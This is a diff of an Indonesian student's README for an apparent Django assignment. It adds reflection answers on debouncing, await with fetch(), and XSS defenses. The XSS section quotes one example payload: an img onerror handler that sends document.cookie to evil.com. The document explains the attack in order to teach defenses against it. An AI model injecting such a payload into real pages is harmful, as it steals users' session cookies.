@@ -122,14 +122,51 @@ AI tidak saya pakai buat ngehasilin seluruh aplikasi dari nol. Implementasi utam
 
 ### Strategi Prompting
 
-Untuk tugas 4 ini saya sebenarnya tidak terlalu bergantung AI karena setelah tutorial 4, banyak checkbox di tugas 4 sudah kelar jadi saya cuman finishing seperti update yg gaada di tutorial 4.
+Untuk tugas 5 ini saya sebenarnya tidak terlalu bergantung AI karena setelah tutorial 5, banyak checkbox di tugas 5 sudah kelar jadi saya cuman finishing yg gaada di tutorial 5.
 
-Menanyakan cara memasukkan user ke dalam salah satu group di Django.
-Menanyakan cara menerapkan pembatasan hak akses di sisi server (server-side check) sesuai 4 peran/role (mengalihkan ke login jika belum masuk, serta mengembalikan HTTP 403 Forbidden untuk aksi yang dilarang).
+Tolong rapihkan jawaban saya ke dalam bentuk read.me yang rapih (sayya memberi input jawaban tugas refleksi menurut pemahamana saya lalu AI mmemberi tambahan dan sekaligus merapihkan)
 
-Menanyakan kebenaran dari potongan kode pengecekan kondisi: if not request.user.is_superuser or request.user.is_editor: raise PermissionDenied
+### Tugas Refleksi
 
-Verifikasi Sintaks Django Template ({% if %}): {% if user.is_superuser or request.user.groups.filter(name='editor').exists() %}
+#### 1. Debouncing pada Pencarian AJAX
 
+**Debouncing** adalah teknik menunda eksekusi sebuah fungsi sampai user berhenti melakukan aksi tertentu selama jangka waktu tertentu. Daripada fungsi dipanggil di setiap event, timer di-reset tiap kali event baru datang, jadi fungsi cuma jalan sekali setelah jeda terakhir — di proyek ini jeda-nya 300 ms (`SEARCH_DEBOUNCE_DELAY` di `projects.html`).
+
+Teknik ini penting buat pencarian AJAX karena:
+
+- **Mengurangi jumlah request ke server.** Kalau user ngetik "portfolio website" (20 chars), tanpa debounce bisa terkirim ~20 request cuma buat 1 kata pencarian. Dengan debounce cuma 1 request setelah user berhenti ngetik.
+- **Menghemat beban server dan bandwidth.** Tiap request AJAX itu query ke database (`filter(title__icontains=...)`) plus serialisasi JSON. Request yang menumpuk bikin server kerja doang buat data yang langsung dibuang.
+- **Mencegah race condition / hasil saling tabrak.** Kalau request dikirim berurutan dan responsenya datang nggak berurutan (request lama balik lebih lambat), list bisa ketimpa sama data hasil pencarian lama. Selain debounce, di `fetchProjects()` juga ada `AbortController` buat membatalkan request sebelumnya.
+- **Respons lebih smooth.** User nggak lihat list kedip-kedip berganti tiap huruf; list baru muncul setelah input stabil.
+
+#### 2. Fungsi `await` pada `fetch()`
+
+`fetch()` itu **asinkron**: dia langsung balikin objek `Promise` dan nggak nunggu respons server selesai. `await` bikin eksekusi fungsi `async` berhenti di titik itu sampai Promise-nya selesai (resolved), lalu nilai hasil responsnya diambil dan dipakai di baris berikutnya.
+
+```js
+const response = await fetch(url);          // berhenti sampai server jawab
+const projectData = await response.json();  // berhenti sampai body terurai jadi JSON
+```
+
+Kalau `await` nggak dipakai, `response` akan berisi **Promise**, bukan objek Respons:
+
+- `response.ok` → `undefined` (bukan `true`/`false`), jadi `if (!response.ok)` jadi salah baca.
+- `response.json()` → bakal error / balikin Promise lagi, jadi `projectData` bukan array melainkan objek Promise.
+- Kode setelah fetch jalan **sebelum data sampai** → `projectData.length === 0` bakal `undefined` sehingga selalu dianggap kosong, list nggak pernah ke-render, dan error-nya muncul di console sebagai "cannot read property of undefined".
+
+Intinya: tanpa `await`, kita pegang "janji" hasilnya, bukan hasilnya sendiri, sehingga urutan baca data jadi kacau.
+
+#### 3. Serangan XSS dan Kenapa Data AJAX Lebih Rentan
+
+**XSS (Cross-Site Scripting)** adalah serangan menyisipkan skrip berbahaya (biasanya JavaScript) ke dalam halaman web lewat input user yang nggak dibersihkan, lalu dijalankan di browser korban dengan sesi/cookie-nya. Contohnya user nyisipin `<img src=x onerror="document.location='https://evil.com/?c='+document.cookie">` ke deskripsi proyek; kalau dipasang mentah-mentah ke DOM, skripnya jalan dan cookie session bisa kecuri.
+
+Data yang dirender lewat AJAX/JavaScript **lebih rentan** daripada lewat template Django karena:
+
+- **Django template auto-escape bawaan.** Semua `{{ variable }}` otomatis di-escape jadi `&lt;script&gt;` sehingga tag nggak pernah jadi HTML. Escape ini terjadi di server, nggak bisa dilupakan.
+- **`innerHTML` nggak punya proteksi otomatis.** Kalau JavaScript nyisipin string dari JSON respons fetch pakai `innerHTML = ...`, browser langsung nge-parse string itu sebagai HTML. Satu field yang lolos aja udah cukup buat XSS.
+- **Datanya datang dari endpoint JSON yang berbeda.** Prosesnya dua tahap: server nge-serialize data → JavaScript nge-render ulang. Titik escape-nya pindah ke tangan JavaScript, jadi kewaspadaannya harus manual di tiap sisipan (`escapeHtml()` di `projects.html`) bukan otomatis kayak template.
+- **Isi JSON sering dianggap "aman".** Karena respons JSON bukan halaman HTML, developer kadang lupa bahwa isinya tetap data user yang belum tentu bersih.
+
+Makanya pertahanannya dua lapis di proyek ini: **client-side** pakai `escapeHtml()` sebelum semua nilai dimasukkan ke template literal HTML (dan `textContent` buat toast), plus **server-side** pakai `strip_tags()` di `clean_title`, `clean_role`, dan `clean_description` pada `ProjectForm` supaya tag HTML dibersihkan sebelum kesimpen di database.
 
 
